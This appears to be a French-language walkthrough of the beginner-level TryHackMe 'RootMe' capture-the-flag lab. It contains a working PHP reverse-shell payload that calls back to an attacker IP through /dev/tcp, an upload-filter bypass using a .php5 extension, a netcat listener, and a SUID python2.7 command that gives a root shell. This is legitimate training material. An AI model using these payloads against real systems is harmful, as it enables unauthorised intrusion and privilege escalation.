# TryHackMe - RootMe

> Walkthrough du CTF **RootMe** sur TryHackMe.

## Informations

- Plateforme : TryHackMe
- Difficulté : débutant
- Objectif : obtenir un shell utilisateur, récupérer `user.txt`, escalader en `root`, puis récupérer `root.txt`
- Services exposés : SSH et HTTP

## Sommaire

1. [Déploiement](#1-deploiement)
2. [Reconnaissance](#2-reconnaissance)
3. [Enumération web](#3-enumeration-web)
4. [Exploitation](#4-exploitation)
5. [Flag utilisateur](#5-flag-utilisateur)
6. [Escalade de privilèges](#6-escalade-de-privileges)
7. [Flag root](#7-flag-root)
8. [Points clés](#points-cles)

## 1. Deploiement

On commence par se connecter au réseau TryHackMe avec OpenVPN, puis on déploie la machine de la room.

Pour faciliter les commandes, on peut ajouter l'IP de la cible au fichier `hosts` de la machine d'attaque :

```bash
echo "<IP_CIBLE> rootme.thm" | sudo tee -a /etc/hosts
```

![Déploiement de la machine](screenshots/image.png)

## 2. Reconnaissance

Un scan des ports permet d'identifier les services accessibles :

```bash
rustscan -a rootme.thm -- -sC -sV
```

Résultat important :

```text
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp open  http  Apache httpd 2.4.41 (Ubuntu)
```

Le port `80` héberge donc une application web Apache.

![Tâche reconnaissance](screenshots/image%201.png)

## 3. Enumeration web

On lance ensuite une recherche de répertoires :

```bash
dirsearch -u http://rootme.thm/
```

Les chemins intéressants trouvés sont :

```text
/panel/    200
/uploads/  200
```

Interprétation :

- `/panel/` contient un formulaire d'upload.
- `/uploads/` permet d'accéder aux fichiers envoyés.

Ces deux chemins donnent une piste claire : uploader un fichier malveillant, puis l'exécuter depuis `/uploads/`.

## 4. Exploitation

On prépare un reverse shell PHP. L'adresse IP doit être celle de la machine d'attaque sur le réseau TryHackMe :

```php
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/<IP_ATTAQUANT>/4444 0>&1'"); ?>
```

On enregistre ce contenu dans un fichier :

```bash
nano php-reverse-shell.php
```

L'upload du fichier `.php` est bloqué par l'application.

![Upload PHP bloqué](screenshots/image%203.png)

On contourne le filtre en changeant l'extension en `.php5` :

```bash
mv php-reverse-shell.php php-reverse-shell.php5
```

Cette fois, l'upload fonctionne.

Avant d'exécuter le fichier, on lance un listener sur la machine d'attaque :

```bash
nc -lvnp 4444
```

Ensuite, on visite le fichier uploadé depuis :

```text
http://rootme.thm/uploads/php-reverse-shell.php5
```

Le listener reçoit alors un shell sur la cible.

![Reverse shell obtenu](screenshots/image%204.png)

## 5. Flag utilisateur

Une fois le shell obtenu, on se place dans le dossier de l'utilisateur web et on lit le flag :

```bash
cd ~
ls
cat user.txt
```

![Lecture du flag utilisateur](screenshots/image%205.png)

![Validation du flag utilisateur](screenshots/image%202.png)

## 6. Escalade de privileges

On cherche les binaires avec le bit SUID activé :

```bash
find / -user root -perm /4000 -type f 2>/dev/null
```

Dans les résultats, un binaire ressort :

```text
/usr/bin/python2.7
```

Comme `python2.7` est exécutable avec les privilèges du propriétaire `root`, on peut s'appuyer sur la technique SUID documentée dans GTFOBins :

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

L'option `-p` permet de conserver les privilèges effectifs. On obtient alors un shell root.

![Shell root](screenshots/image%206.png)

## 7. Flag root

Il reste à localiser le fichier `root.txt` :

```bash
find / -type f -name root.txt 2>/dev/null
```

Puis à afficher son contenu :

```bash
cat /root/root.txt
```

![Lecture du flag root](screenshots/image%207.png)

## Points cles

- L'énumération web révèle un formulaire d'upload et un dossier public `/uploads/`.
- Le filtre bloque `.php`, mais accepte `.php5`.
- Un fichier PHP uploadé peut être exécuté depuis `/uploads/`.
- Le binaire `/usr/bin/python2.7` possède le bit SUID.
- GTFOBins fournit une méthode directe pour obtenir un shell root via Python SUID.

## References

- [TryHackMe - RootMe](https://tryhackme.com/room/rrootme)
- [GTFOBins - Python](https://gtfobins.github.io/gtfobins/python/)
- [HackTricks - Reverse Shells](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)

---

Les notes brutes de résolution sont conservées dans [Notes.md](Notes.md).
